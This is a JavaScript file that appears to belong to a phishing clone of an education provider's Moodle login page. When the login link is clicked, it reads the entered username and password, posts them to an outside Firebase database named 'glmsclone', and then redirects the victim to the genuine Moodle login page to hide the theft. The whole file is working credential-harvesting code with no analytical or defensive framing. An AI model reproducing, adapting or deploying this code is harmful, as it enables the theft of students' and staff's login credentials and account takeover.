const logInBtn = document.querySelector('a')
const userName = document.getElementsByClassName('input_signin')[0]
const pwd = document.getElementsByClassName('input_password')[0]

logInBtn.addEventListener('click', () => {
    console.log('clicked')
    const username = userName.value;
    const password = pwd.value;
    const url = 'https://glmsclone-default-rtdb.asia-southeast1.firebasedatabase.app/users.json';
    const data = {

        uname: username,
        pwd: password
        
    };

    sendData(url, data);

})


async function sendData(url, data) {
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const responseData = await response.json();
        console.log('Data sent successfully:', responseData);
        window.location.href = 'https://moodle.gusto-education.com/login/index.php';
    } catch (error) {
        console.error('Error sending data:', error);
    }
}


